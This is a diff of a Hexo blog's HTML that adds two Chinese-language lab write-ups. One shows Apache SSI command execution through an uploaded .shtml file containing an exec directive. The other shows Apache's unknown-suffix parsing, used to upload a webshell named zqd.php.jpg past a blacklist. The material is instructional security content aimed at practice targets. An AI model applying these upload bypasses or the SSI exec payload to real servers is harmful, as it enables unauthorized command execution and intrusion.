 <h1 id="Apache-SSI-远程命令执行漏洞"><a href="#Apache-SSI-远程命令执行漏洞" class="headerlink" title="Apache SSI 远程命令执行漏洞"></a>Apache SSI 远程命令执行漏洞</h1><p>漏洞原理<br>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<!--#exec cmd="id" -->语法执行任意命令。<br>&amp;emsp；<br>先创建一个php文件<br><a href="https://imgchr.com/i/mAP3LT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAP3LT.png" alt="mAP3LT.png"></a><br>然后打开靶机上传文件<br><a href="https://imgchr.com/i/mAPJwF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAPJwF.png" alt="mAPJwF.png"></a><br>然后发现不可以<br>正常上传PHP文件是不允许的，我们可以上传一个.shtml文件：<br><a href="https://imgchr.com/i/mAPaWR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAPaWR.png" alt="mAPaWR.png"></a><br>然后通过bp拦截 把ss.php 后缀改成ss.shtml  go一下<br><a href="https://imgchr.com/i/mAPseO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAPseO.png" alt="mAPseO.png"></a><br>然后访问靶机ip/8080/ss.shtml 就可以解析成功<br><a href="https://imgchr.com/i/mAPgFH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAPgFH.png" alt="mAPgFH.png"></a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/ld (4)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/25/ld (4)/" itemprop="url">Apache HTTPD 未知后缀解析漏洞</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-25T09:16:18+08:00">
+                2019-07-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h1 id="Apache-HTTPD-未知后缀解析漏洞"><a href="#Apache-HTTPD-未知后缀解析漏洞" class="headerlink" title="Apache HTTPD 未知后缀解析漏洞"></a>Apache HTTPD 未知后缀解析漏洞</h1><p>改漏洞属于用户配置不当产生的漏洞，与具体中间件版本无关。<br>与其说这是漏洞，不如说是apache的特性，就是我们平常所说的从右向左解析是一样的。<br>当apache遇到无法识别解析的文件后缀时，会向前解析，如xxx.php.123.456,在mime.types文件中如果不存在.123/.456这两种后缀，那么apache会将该文件解析为php。<br>同样也可以在httpd.conf文件中更改参数或是直接配置.htaccess。<br>首先创建一个名为zqd.php.jpg的一句话木马。<br><a href="https://imgchr.com/i/mACdr8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mACdr8.png" alt="mACdr8.png"></a><br>这里名称保存为zqd.php.jpg，是为了绕过黑名单机制<br>访问靶机 然后上传<br><a href="https://imgchr.com/i/mACc2q" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mACc2q.png" alt="mACc2q.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mAC7GR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mAC7GR.png" alt="mAC7GR.png"></a><br>连接蚁剑<br><a href="https://imgchr.com/i/mACXqO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mACXqO.png" alt="mACXqO.png"></a><br>成功</p>
 
           
         
@@ -1504,7 +1383,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">9</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1517,7 +1396,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">9</span>
                   <span class="site-state-item-name">tags</span>
                 
               </div>
